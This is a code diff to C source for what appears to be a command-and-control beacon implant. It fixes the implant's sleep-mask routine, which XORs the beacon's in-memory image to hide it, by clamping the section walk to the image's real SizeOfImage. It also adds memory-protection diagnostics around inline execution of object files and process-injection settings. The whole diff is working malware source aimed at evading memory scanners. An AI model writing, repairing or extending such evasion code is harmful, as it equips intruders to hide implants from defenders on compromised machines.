@@ -293,8 +293,8 @@ static void sm_dump_prots(char * buf, int * np, void * p, char * tag) {
 		*np += wsprintfA(buf + *np, "%s=?\r\n", tag);
 		return;
 	}
-	*np += wsprintfA(buf + *np, "%s alloc=%08X prot=%08X state=%08X type=%08X\r\n",
-		tag, m.AllocationProtect, m.Protect, m.State, m.Type);
+	*np += wsprintfA(buf + *np, "%s ab=%p alloc=%08X prot=%08X state=%08X type=%08X\r\n",
+		tag, m.AllocationBase, m.AllocationProtect, m.Protect, m.State, m.Type);
 }
 
 /* last byte offset covered by the (real) sections table, for RWX flips */
@@ -316,6 +316,46 @@ static DWORD sm_max_end(GARGLEP * gp) {
 	return maxe;
 }
 
+/* SizeOfImage from our own PE header: the true extent of the mapped image.
+ * The TS-delivered GARGLE_SECTIONS table describes the OFFICIAL sleeve
+ * layout, which is larger than ours; walking it runs off our mapping. */
+static DWORD sm_image_size(char * base) {
+	unsigned short e_lfanew;
+	if (base == NULL || base[0] != 'M' || base[1] != 'Z')
+		return 0;
+	memcpy(&e_lfanew, base + 0x3C, sizeof(e_lfanew));
+	if (base[e_lfanew] != 'P' || base[e_lfanew + 1] != 'E')
+		return 0;
+	return *(DWORD *)(base + e_lfanew + 0x50);
+}
+
+/* Clamp the sections walk to our own image: pairs beyond SizeOfImage end
+ * the table, pairs straddling it are cut. Returns the new span. */
+static DWORD sm_clamp_sections(GARGLEP * gp) {
+	DWORD img = sm_image_size(gp ? gp->beacon_ptr : NULL);
+	int i;
+	if (img == 0 || gp->sections == NULL)
+		return 0;
+	for (i = 0; i < 64; i++) {
+		DWORD a = gp->sections[i * 2];
+		DWORD b = gp->sections[i * 2 + 1];
+		if (a == 0 && b == 0)
+			break;
+		if (a >= img) {
+			gp->sections[i * 2] = 0;
+			gp->sections[i * 2 + 1] = 0;
+			break;
+		}
+		if (b > img)
+			gp->sections[i * 2 + 1] = img;
+	}
+	return sm_max_end(gp);
+}
+
+
+static DWORD g_sm_spanraw;
+static DWORD g_sm_img;
+
 static void sm_dump_gparms(GARGLEP * gp, char * bof, SIZE_T blen, DWORD t,
 	DWORD sm_mode, DWORD sm_span, void * entryp) {
 	HANDLE h;
@@ -335,13 +375,25 @@ static void sm_dump_gparms(GARGLEP * gp, char * bof, SIZE_T blen, DWORD t,
 	}
 	n += wsprintfA(buf + n, "beacon_ptr=%p sections=%p heap=%p\r\n",
 		gp->beacon_ptr, gp->sections, gp->heap_records);
-	n += wsprintfA(buf + n, "sm_mode=%u span=%X procinj I=%04X F=%04X\r\n",
-		sm_mode, sm_span,
+	n += wsprintfA(buf + n, "sm_mode=%u spanraw=%X span=%X img=%X procinj I=%04X F=%04X\r\n",
+		sm_mode, g_sm_spanraw, sm_span, g_sm_img,
 		(unsigned short)setting_short(SETTING_PROCINJ_PERMS_I),
 		(unsigned short)setting_short(SETTING_PROCINJ_PERMS));
 	sm_dump_prots(buf, &n, gp->beacon_ptr, "q_beacon:");
 	if (sm_span != 0)
 		sm_dump_prots(buf, &n, (char *)gp->beacon_ptr + sm_span - 1, "q_beacon_end:");
+	if (gp->beacon_ptr != NULL && g_sm_spanraw != 0) {
+		DWORD off;
+		for (off = 0; off < g_sm_spanraw + 0x10000 && n < 3700; off += 0x10000) {
+			MEMORY_BASIC_INFORMATION m;
+			if (VirtualQuery((char *)gp->beacon_ptr + off, &m, sizeof(m)) == 0) {
+				n += wsprintfA(buf + n, "pg[%05X] ?\r\n", off);
+				continue;
+			}
+			n += wsprintfA(buf + n, "pg[%05X] ab=%p prot=%08X st=%08X\r\n",
+				off, m.AllocationBase, m.Protect, m.State);
+		}
+	}
 	sm_dump_prots(buf, &n, gp->sections, "q_sect:");
 	sm_dump_prots(buf, &n, gp->heap_records, "q_heap:");
 	sm_dump_prots(buf, &n, bof, "q_bof:");
@@ -762,6 +814,13 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 					if (GetFileAttributesA("C:\\Users\\Public\\sm_t1") != INVALID_FILE_ATTRIBUTES)
 						sm_mode |= 32;
 					sm_span = sm_max_end(gparms);
+					g_sm_spanraw = sm_span;
+					g_sm_img = sm_image_size(gparms ? gparms->beacon_ptr : NULL);
+					/* FIX: the delivered table describes the official sleeve
+					 * layout (larger than ours); clamp the walk to OUR image
+					 * or it XORs 112KB past the mapping. */
+					if (gparms != NULL && g_sm_img != 0 && sm_span > g_sm_img)
+						sm_span = sm_clamp_sections(gparms);
 					sm_dump_gparms(gparms, code_dst, total, t, sm_mode, sm_span,
 						(void *)inlinefunc);
 					if (gparms != NULL) {
